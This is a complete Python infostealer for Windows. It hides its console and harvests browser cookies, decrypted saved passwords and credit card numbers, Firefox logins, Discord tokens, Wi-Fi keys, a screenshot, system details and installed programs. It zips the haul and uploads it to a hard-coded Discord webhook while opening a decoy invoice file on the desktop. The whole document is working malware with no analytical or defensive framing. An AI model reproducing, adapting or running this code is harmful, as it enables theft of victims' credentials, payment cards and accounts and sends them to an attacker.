import os
import json
import requests
import threading
import tempfile
import zipfile
import subprocess
import sqlite3
import shutil
import win32crypt
import base64
import re
import sys
import platform
import socket
from datetime import datetime
from Crypto.Cipher import AES
import ctypes

WEBHOOK = "https://discord.com/api/webhooks/1529972286671814828/DsREj38ZscfwOleZ57wGcTwgGAg0K5M5nwsrspJ7jLlHTc4qetNQFg8ly-Z_TWKFadDY"

# Hide console
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ============ BROWSER PATHS ============
def get_browser_paths():
    return {
        'chrome': {
            'local': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default'),
            'roaming': os.path.join(os.environ['APPDATA'], 'Google', 'Chrome', 'User Data', 'Default')
        },
        'edge': {
            'local': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default'),
            'roaming': os.path.join(os.environ['APPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default')
        },
        'brave': {
            'local': os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
            'roaming': os.path.join(os.environ['APPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default')
        },
        'opera': {
            'local': os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable'),
            'roaming': os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable')
        }
    }

# ============ DECRYPT FUNCTIONS ============
def get_chrome_key():
    try:
        local_state = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Local State')
        with open(local_state, 'r', encoding='utf-8') as f:
            local_state_json = json.load(f)
        encrypted_key = base64.b64decode(local_state_json['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key
    except:
        return None

def decrypt_password(encrypted, key):
    try:
        nonce = encrypted[3:15]
        ciphertext = encrypted[15:-16]
        tag = encrypted[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted.decode('utf-8')
    except:
        try:
            return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
        except:
            return ""

# ============ 1. COOKIES ============
def steal_cookies():
    data = {}
    try:
        import browser_cookie3
        browsers = {
            "chrome": browser_cookie3.chrome,
            "firefox": browser_cookie3.firefox,
            "edge": browser_cookie3.edge,
            "opera": browser_cookie3.opera,
            "brave": browser_cookie3.brave
        }
        for name, func in browsers.items():
            try:
                cj = func(domain_name='.')
                data[name] = [{'name': c.name, 'value': c.value, 'domain': c.domain} for c in cj]
            except:
                pass
    except:
        pass
    return data

# ============ 2. PASSWORDS ============
def steal_passwords():
    passwords = {'chrome': [], 'edge': [], 'brave': [], 'firefox': [], 'opera': []}
    
    # Chrome, Edge, Brave
    browsers = [
        ('chrome', os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')),
        ('edge', os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')),
        ('brave', os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data'))
    ]
    
    key = get_chrome_key()
    if key:
        for name, path in browsers:
            if os.path.exists(path):
                try:
                    temp_db = os.path.join(tempfile.gettempdir(), f'{name}_passwords.db')
                    shutil.copyfile(path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in cursor.fetchall():
                        url, username, encrypted = row
                        if username and encrypted:
                            decrypted = decrypt_password(encrypted, key)
                            if decrypted:
                                passwords[name].append({'url': url, 'username': username, 'password': decrypted})
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass
    
    # Firefox
    try:
        firefox_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
        if os.path.exists(firefox_path):
            for profile in os.listdir(firefox_path):
                logins_path = os.path.join(firefox_path, profile, 'logins.json')
                if os.path.exists(logins_path):
                    with open(logins_path, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                        for login in data.get('logins', []):
                            passwords['firefox'].append({
                                'url': login.get('hostname', ''),
                                'username': login.get('usernameField', ''),
                                'password': login.get('password', '')
                            })
    except:
        pass
    
    # Opera
    try:
        opera_path = os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Login Data')
        if os.path.exists(opera_path):
            temp_db = os.path.join(tempfile.gettempdir(), 'opera_passwords.db')
            shutil.copyfile(opera_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url, username, encrypted = row
                if username and encrypted:
                    decrypted = decrypt_password(encrypted, key)
                    if decrypted:
                        passwords['opera'].append({'url': url, 'username': username, 'password': decrypted})
            conn.close()
            os.remove(temp_db)
    except:
        pass
    
    return passwords

# ============ 3. CREDIT CARDS ============
def steal_credit_cards():
    cards = {'chrome': [], 'edge': [], 'brave': []}
    browsers = [
        ('chrome', os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Web Data')),
        ('edge', os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data')),
        ('brave', os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Web Data'))
    ]
    
    key = get_chrome_key()
    if key:
        for name, path in browsers:
            if os.path.exists(path):
                try:
                    temp_db = os.path.join(tempfile.gettempdir(), f'{name}_cards.db')
                    shutil.copyfile(path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    for row in cursor.fetchall():
                        name, month, year, encrypted = row
                        if encrypted:
                            decrypted = decrypt_password(encrypted, key)
                            if decrypted:
                                cards[name].append({
                                    'name': name,
                                    'card_number': decrypted,
                                    'exp_month': month,
                                    'exp_year': year
                                })
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass
    
    return cards

# ============ 4. DISCORD TOKENS ============
def steal_discord_tokens():
    tokens = []
    paths = [
        os.path.join(os.environ['APPDATA'], 'Discord', 'Local Storage', 'leveldb'),
        os.path.join(os.environ['APPDATA'], 'DiscordPTB', 'Local Storage', 'leveldb'),
        os.path.join(os.environ['APPDATA'], 'DiscordCanary', 'Local Storage', 'leveldb'),
        os.path.join(os.environ['LOCALAPPDATA'], 'Discord', 'Local Storage', 'leveldb')
    ]
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith('.log'):
                    try:
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            content = f.read()
                            matches = re.findall(r'([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27})', content)
                            tokens.extend(matches)
                    except:
                        pass
    return list(set(tokens))

# ============ 5. SYSTEM INFO ============
def steal_system_info():
    info = {
        'user': os.environ.get('USERNAME', ''),
        'computer': os.environ.get('COMPUTERNAME', ''),
        'os': platform.system() + ' ' + platform.release(),
        'architecture': platform.machine(),
        'ip': '',
        'mac': '',
        'hostname': socket.gethostname()
    }
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        info['ip'] = response.text
    except:
        pass
    try:
        import uuid
        info['mac'] = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])
    except:
        pass
    return info

# ============ 6. SCREENSHOT ============
def steal_screenshot():
    try:
        from PIL import ImageGrab
        screenshot = ImageGrab.grab()
        screenshot_path = os.path.join(tempfile.gettempdir(), 'screenshot.png')
        screenshot.save(screenshot_path)
        return screenshot_path
    except:
        return None

# ============ 7. WIFI PASSWORDS ============
def steal_wifi_passwords():
    wifi = []
    try:
        output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='utf-8')
        profiles = re.findall(r'All User Profile\s*:\s*(.*)', output)
        for profile in profiles:
            profile = profile.strip()
            try:
                details = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], encoding='utf-8')
                password = re.search(r'Key Content\s*:\s*(.*)', details)
                if password:
                    wifi.append({
                        'ssid': profile,
                        'password': password.group(1).strip()
                    })
            except:
                pass
    except:
        pass
    return wifi

# ============ 8. INSTALLED PROGRAMS ============
def steal_installed_programs():
    programs = []
    try:
        import winreg
        uninstall_keys = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]
        for key_path in uninstall_keys:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                for i in range(0, winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        name = winreg.QueryValueEx(subkey, "DisplayName")[0] if "DisplayName" in [winreg.EnumValue(subkey, j)[0] for j in range(winreg.QueryInfoKey(subkey)[1])] else ""
                        if name:
                            programs.append(name)
                    except:
                        pass
            except:
                pass
    except:
        pass
    return programs[:50]  # Limit to 50

# ============ 9. SEND EVERYTHING ============
def send_everything():
    try:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        tmp = tempfile.gettempdir()
        zip_path = os.path.join(tmp, f'steal_{ts}.zip')
        
        data = {
            'cookies': steal_cookies(),
            'passwords': steal_passwords(),
            'credit_cards': steal_credit_cards(),
            'discord_tokens': steal_discord_tokens(),
            'system_info': steal_system_info(),
            'wifi_passwords': steal_wifi_passwords(),
            'installed_programs': steal_installed_programs(),
            'timestamp': ts
        }
        
        # Save data
        json_path = os.path.join(tmp, f'data_{ts}.json')
        with open(json_path, 'w') as f:
            json.dump(data, f, indent=2)
        
        # Add screenshot
        screenshot_path = steal_screenshot()
        if screenshot_path and os.path.exists(screenshot_path):
            with zipfile.ZipFile(zip_path, 'w') as z:
                z.write(json_path, os.path.basename(json_path))
                z.write(screenshot_path, 'screenshot.png')
            os.remove(screenshot_path)
        else:
            with zipfile.ZipFile(zip_path, 'w') as z:
                z.write(json_path, os.path.basename(json_path))
        
        # Send
        with open(zip_path, 'rb') as f:
            requests.post(WEBHOOK, files={'file': (f'steal_{ts}.zip', f)}, timeout=20)
        
        # Cleanup
        os.remove(json_path)
        os.remove(zip_path)
    except Exception as e:
        pass

# ============ RUN ============
threading.Thread(target=send_everything, daemon=True).start()

# Open fake invoice
try:
    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    with open(os.path.join(desktop, 'Invoice_2026.txt'), 'w') as f:
        f.write("INVOICE #2026\nTotal: $0.00\n\nThank you for your business!")
    os.startfile(os.path.join(desktop, 'Invoice_2026.txt'))
except:
    pass

# Keep alive
import time
time.sleep(15)